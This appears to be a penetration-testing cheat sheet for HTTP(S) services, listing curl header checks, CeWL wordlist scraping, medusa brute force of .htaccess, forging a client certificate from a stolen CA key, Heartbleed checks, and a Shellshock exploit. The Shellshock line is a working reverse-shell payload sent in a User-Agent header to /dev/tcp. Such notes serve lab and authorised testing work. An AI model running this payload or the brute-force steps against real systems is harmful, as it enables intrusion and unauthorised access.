# TCP 80/443: HTTP(S)

> The Hypertext Transfer Protocol is an application protocol for distributed, collaborative, hypermedia information systems.  
>
>  -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol)</cite>

## Related
[Enumeration/Webserver scanning](../01-Enumeration/03-Webserver-scanning.md)

## Information gathering

### 443/https

-> check SSL certificate for **hostnames** and **email addresses**

### General

check headers
```bash
curl -i <ip>
```

follow redirection
```bash
curl -i -L <ip>
```

check links
```bash
curl <ip> -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
```

### URL brute force

see [Enumeration/Webserver scanning](../01-Enumeration/03-Webserver-scanning.md)

### Scrape website 

Scrapes a website to generate password list from words, found there
```bash
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt
```
-> Mutate list using [John the Ripper (JTR)](bear://x-callback-url/open-note?id=A69AD893-511F-4CDD-9D75-10B42E4F3C16-3875-0000096AB4EACDA8)

## .htaccess

brute force
```bash
medusa -h <ip> -u <user> -P <wordlist-file> -M http -m DIR:/admin -T 10
```

## Sign SSL certificate

* got private key from vsftpd backdoor php shell (`ca.key`)
* export certificate from Firefox (`ca.crt`)

```bash
openssl pkey -in ca.key -pubout
openssl x509 -in ca.crt -pubkey -noout

openssl genrsa -out client.key 4096
openssl req -new -key client.key -out client.csr
openssl x509 -req -in client.csr -CA ca.crt -CAkey ca.key -set_serial 9001 -extensions client -days 9002 -outform PEM -out client.cer
openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
openssl verify -verbose -CAfile ca.crt client.cer
```

-> Firefox -> Preferences -> Search certificates -> Import "client.p12", Import "ca.crt" (trust)

### Troubleshooting

* no permission to file, but to folder? -> re-create file!

## Heartbleed

### Check

```bash
sslscan <ip>
```

```bash
sslyze --heartbleed <ip>
```

```bash
nmap -sV --script=ssl-heartbleed -oA nmap_heartbleed <ip>
```

### Exploits

[How to Exploit the Heartbleed Bug](https://stackabuse.com/how-to-exploit-the-heartbleed-bug/)
[GitHub - sensepost/heartbleed-poc: Test for SSL heartbeat vulnerability (CVE-2014-0160)](https://github.com/sensepost/heartbleed-poc)

## Shellshock

Check
```bash
nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/admin.cgi <ip>
```

Exploit
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1" http://<ip>/cgi-bin/admin.cgi
```

## Apache2
Debian: `/etc/apache2/`
CentOS: `/etc/httpd/`

Find document root:
```bash
grep -Ri DocumentRoot .
```

```bash
grep -R '$bigtree\["config"\]\["db"\]' .
```
